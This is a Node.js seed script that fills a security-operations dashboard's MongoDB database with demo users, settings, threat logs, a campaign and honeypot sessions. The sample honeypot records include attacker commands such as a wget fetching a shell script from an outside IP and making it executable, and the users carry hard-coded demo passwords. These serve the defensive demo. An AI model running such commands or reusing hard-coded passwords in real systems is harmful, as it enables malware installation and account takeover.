import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const mongoose = require('../backend/node_modules/mongoose');
const bcrypt = require('../backend/node_modules/bcryptjs');

// Parse database argument or default to sentinel-db
const dbArg = process.argv.find(a => a.startsWith('--db='));
const targetDbName = dbArg ? dbArg.split('=')[1] : 'sentinel-db';

const ALLOWED_DATABASES = ['sentinel-db', 'sentinel-db-copy', 'sentinel-test-seed'];
if (!ALLOWED_DATABASES.includes(targetDbName)) {
  console.error(`[BLOCKED] Target database "${targetDbName}" is not in the allowed database list: ${ALLOWED_DATABASES.join(', ')}`);
  process.exit(1);
}

const MONGO_URI = process.env.MONGO_URI || `mongodb://127.0.0.1:27017/${targetDbName}`;

async function seedDemo() {
  console.log(`=== SENTINELAI IDEMPOTENT DEMO SEED SCRIPT ===`);
  console.log(`Target Database: ${targetDbName}`);
  console.log(`Connection URI:  ${MONGO_URI}`);
  console.log(`Mode: Non-Destructive / Idempotent (Zero Deletes)`);

  await mongoose.connect(MONGO_URI);
  const db = mongoose.connection.db;

  let createdCounts = {
    users: 0,
    threatlogs: 0,
    honeypotsessions: 0,
    campaigns: 0,
    systemsettings: 0,
    alerts: 0,
  };

  // 1. Core SOC Users
  const pAdmin = await bcrypt.hash('Admin@1234', 12);
  const pAnalyst = await bcrypt.hash('Analyst@1234', 12);
  const pViewer = await bcrypt.hash('Viewer@1234', 12);

  const demoUsers = [
    { email: 'admin@sentinel.io', name: 'Admin User', role: 'admin', password: pAdmin, authVersion: 0, tokenVersion: 0, mustChangePassword: false, status: 'active', department: 'SOC' },
    { email: 'arjun@sentinel.io', name: 'Arjun Sharma', role: 'analyst', password: pAnalyst, authVersion: 8, tokenVersion: 8, mustChangePassword: false, status: 'active', department: 'SOC' },
    { email: 'priya@sentinel.io', name: 'Priya Krishnan', role: 'analyst', password: pAnalyst, authVersion: 0, tokenVersion: 0, mustChangePassword: false, status: 'active', department: 'SOC' },
    { email: 'sara@sentinel.io', name: 'Sara Mehta', role: 'viewer', password: pViewer, authVersion: 0, tokenVersion: 0, mustChangePassword: false, status: 'active', department: 'SOC' },
    { email: 'operator1@sentinel.io', name: 'Operator One', role: 'analyst', password: pAnalyst, authVersion: 4, tokenVersion: 4, mustChangePassword: false, status: 'active', department: 'SOC' },
  ];

  for (const u of demoUsers) {
    const res = await db.collection('users').updateOne(
      { email: u.email },
      { $setOnInsert: { ...u, createdAt: new Date(), updatedAt: new Date() } },
      { upsert: true }
    );
    if (res.upsertedCount > 0) createdCounts.users++;
  }

  // 2. System Settings Singleton
  const defaultSettings = [
    { key: 'autoBlockEnabled', value: false, description: 'Autonomous IP blocking upon high AI threat score' },
    { key: 'autoBlockThreshold', value: 0.92, description: 'Minimum confidence score required for autonomous containment' },
    { key: 'retentionDays', value: 90, description: 'Default retention window for telemetry logs' },
  ];
  for (const s of defaultSettings) {
    const res = await db.collection('systemsettings').updateOne(
      { key: s.key },
      { $setOnInsert: { ...s, createdAt: new Date(), updatedAt: new Date() } },
      { upsert: true }
    );
    if (res.upsertedCount > 0) createdCounts.systemsettings++;
  }

  // 3. Demo Honeypot Sessions (Idempotent by sessionId)
  const demoSessions = [
    {
      sessionId: 'demo-05f3de76',
      sourceIP: '45.95.147.22',
      sourcePort: 51234,
      honeypotNode: 'SSH-COWRIE-01',
      protocol: 'SSH',
      geoLocation: { country: 'Russia', countryCode: 'RU', city: 'Moscow' },
      credentials: [{ username: 'root', password: '***REDACTED***', success: false }],
      commands: [{ command: 'chmod +x shell.sh', timestamp: new Date(), output: '', success: true, intent: 'PRIVILEGE_ESCALATION' }],
      status: 'closed',
      durationSeconds: 145,
      deceptionScore: 45,
      engagementLevel: 'medium',
      createdAt: new Date(),
      updatedAt: new Date(),
    },
    {
      sessionId: 'demo-ddde5c00',
      sourceIP: '185.220.101.47',
      sourcePort: 49152,
      honeypotNode: 'SSH-COWRIE-01',
      protocol: 'SSH',
      geoLocation: { country: 'Germany', countryCode: 'DE', city: 'Frankfurt' },
      credentials: [{ username: 'admin', password: '***REDACTED***', success: false }],
      commands: [{ command: 'wget http://45.95.147.22/shell.sh', timestamp: new Date(), output: 'Connected.', success: true, intent: 'MALWARE_DOWNLOAD' }],
      malwareDownloaded: ['http://45.95.147.22/shell.sh'],
      iocExtracted: { ips: ['45.95.147.22'], urls: ['http://45.95.147.22/shell.sh'], hashes: [] },
      status: 'closed',
      durationSeconds: 98,
      deceptionScore: 60,
      engagementLevel: 'high',
      createdAt: new Date(),
      updatedAt: new Date(),
    },
  ];

  for (const s of demoSessions) {
    const res = await db.collection('honeypotsessions').updateOne(
      { sessionId: s.sessionId },
      { $setOnInsert: s },
      { upsert: true }
    );
    if (res.upsertedCount > 0) createdCounts.honeypotsessions++;
  }

  // 4. Demo Threat Logs (Idempotent by sourceIP + attackType)
  const demoThreats = [
    {
      severity: 'CRITICAL',
      sourceIP: '198.51.100.88',
      targetService: 'AUTH-SRV-01',
      attackType: 'DDoS',
      aiScore: 0.95,
      confidence: 0.98,
      status: 'BLOCKED',
      autonomousAction: { taken: true, actionType: 'IP_BLOCKED', actionTime: new Date() },
      geoLocation: { country: 'Documentation Network', city: 'RFC 5737' },
      createdAt: new Date(),
      updatedAt: new Date(),
    },
    {
      severity: 'HIGH',
      sourceIP: '45.95.147.22',
      targetService: 'SSH-COWRIE-01',
      attackType: 'SSH Brute Force',
      aiScore: 0.82,
      confidence: 0.89,
      status: 'MONITORING',
      geoLocation: { country: 'Russia', city: 'Moscow' },
      createdAt: new Date(),
      updatedAt: new Date(),
    },
  ];

  for (const t of demoThreats) {
    const res = await db.collection('threatlogs').updateOne(
      { sourceIP: t.sourceIP, attackType: t.attackType },
      { $setOnInsert: t },
      { upsert: true }
    );
    if (res.upsertedCount > 0) createdCounts.threatlogs++;
  }

  // 5. Demo Campaign (Idempotent by name)
  const demoCampaign = {
    name: 'Campaign 45.95.147.22 - SSH Brute Force',
    pattern: 'Distributed SSH Brute Force targeting Linux SSH nodes',
    severity: 'HIGH',
    status: 'ACTIVE',
    attackType: 'SSH Brute Force',
    relatedThreats: [],
    relatedSessions: [],
    indicators: ['45.95.147.22'],
    createdAt: new Date(),
    updatedAt: new Date(),
  };

  const cRes = await db.collection('campaigns').updateOne(
    { name: demoCampaign.name },
    { $setOnInsert: demoCampaign },
    { upsert: true }
  );
  if (cRes.upsertedCount > 0) createdCounts.campaigns++;

  console.log(`\n=== SEED RESULTS (Documents Inserted) ===`);
  console.log(JSON.stringify(createdCounts, null, 2));
  console.log(`If all counts are 0, database was already populated (fully idempotent).`);

  await mongoose.disconnect();
}

seedDemo().catch(err => {
  console.error('[FATAL SEED ERROR]:', err);
  process.exit(1);
});
